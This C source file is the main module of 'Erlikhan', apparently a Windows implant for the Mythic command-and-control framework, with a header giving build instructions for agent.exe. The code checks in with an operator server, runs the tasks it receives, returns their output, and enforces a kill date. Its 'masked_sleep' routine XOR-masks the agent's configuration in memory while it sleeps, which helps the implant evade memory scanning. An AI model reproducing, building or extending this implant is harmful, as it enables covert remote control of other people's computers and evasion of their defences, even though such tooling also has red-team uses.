/* Erlikhan native agent: Mythic implant in C (http, mqtt, dns, msteams).
 *
 * Build (config injected):
 *   zig cc -target x86_64-windows-gnu -O2 -s *.c cJSON.c \
 *     -DCFG_BLOB=".." -DCFG_KEY=".." -DCFG_NONCE=".." \
 *     -lwinhttp -lbcrypt -liphlpapi -o agent.exe
 */
#include "common.h"
#include "crypto.h"
#include "mythic.h"
#include "sysinfo.h"
#include "tasks.h"

/* XOR-mask a region during sleep (nhSleepMasked pattern). */
static void masked_sleep(agent_t *a, int interval, int jitter) {
    static unsigned long long key = 0;
    unsigned char *p;
    size_t i;
    if (key == 0)
        key = ((unsigned long long)GetTickCount() << 32) ^ GetCurrentProcessId() ^ 0x9E3779B97F4A7C15ULL;
    p = (unsigned char *)&a->cfg;
    for (i = 0; i < sizeof(a->cfg); i++)
        p[i] ^= ((unsigned char *)&key)[i & 7];
    task_sleep(interval, jitter);
    for (i = 0; i < sizeof(a->cfg); i++)
        p[i] ^= ((unsigned char *)&key)[i & 7];
}

static int past_killdate(const char *killdate) {
    int y = 0, m = 0, d = 0;
    SYSTEMTIME now;
    if (!killdate || killdate[0] == '\0')
        return 0;
    if (sscanf(killdate, "%4d-%2d-%2d", &y, &m, &d) != 3)
        return 0;
    GetLocalTime(&now);
    if (now.wYear != (WORD)y)
        return now.wYear > (WORD)y;
    if (now.wMonth != (WORD)m)
        return now.wMonth > (WORD)m;
    return now.wDay >= (WORD)d;
}

int main(void) {
    agent_t a;
    int backoff, tries;
    srand(GetTickCount() ^ GetCurrentProcessId());
    if (agent_init(&a) != 0)
        return 1;
    if (a.cfg.retries < 1)
        a.cfg.retries = 1;
    backoff = a.interval;
    for (tries = 1;; tries++) {
        if (past_killdate(a.cfg.killdate)) {
            agent_free(&a);
            return 0;
        }
        if (agent_checkin(&a) == 0)
            break;
        if (tries >= a.cfg.retries) {
            agent_free(&a);
            return 1;
        }
        masked_sleep(&a, backoff, a.jitter);
        backoff *= 2;
    }
    for (;;) {
        task_t *tasks = NULL;
        int count = 0, i, exit = 0;
        response_t *resps = NULL;
        char **outputs = NULL;
        if (past_killdate(a.cfg.killdate)) {
            agent_free(&a);
            return 0;
        }
        tasks = agent_get_tasking(&a, &count);
        if (!tasks) {
            masked_sleep(&a, a.interval, a.jitter);
            continue;
        }
        if (count == 0) {
            tasks_free(tasks, 0);
            masked_sleep(&a, a.interval, a.jitter);
            continue;
        }
        resps = (response_t *)calloc((size_t)count, sizeof(response_t));
        outputs = (char **)calloc((size_t)count, sizeof(char *));
        if (!resps || !outputs) {
            free(resps);
            free(outputs);
            tasks_free(tasks, count);
            agent_free(&a);
            return 1;
        }
        for (i = 0; i < count; i++) {
            int done = 0;
            task_dispatch(&a, &tasks[i], &resps[i], &outputs[i], &done);
            resps[i].user_output = outputs[i] ? outputs[i] : resps[i].user_output;
            exit = exit || done;
        }
        tasks_free(tasks, count);
        if (agent_post_responses(&a, resps, count) != 0) {
            for (i = 0; i < count; i++)
                free(outputs[i]);
            free(outputs);
            free(resps);
            masked_sleep(&a, a.interval, a.jitter);
            continue;
        }
        for (i = 0; i < count; i++)
            free(outputs[i]);
        free(outputs);
        free(resps);
        if (exit) {
            agent_free(&a);
            return 0;
        }
        masked_sleep(&a, a.interval, a.jitter);
    }
}
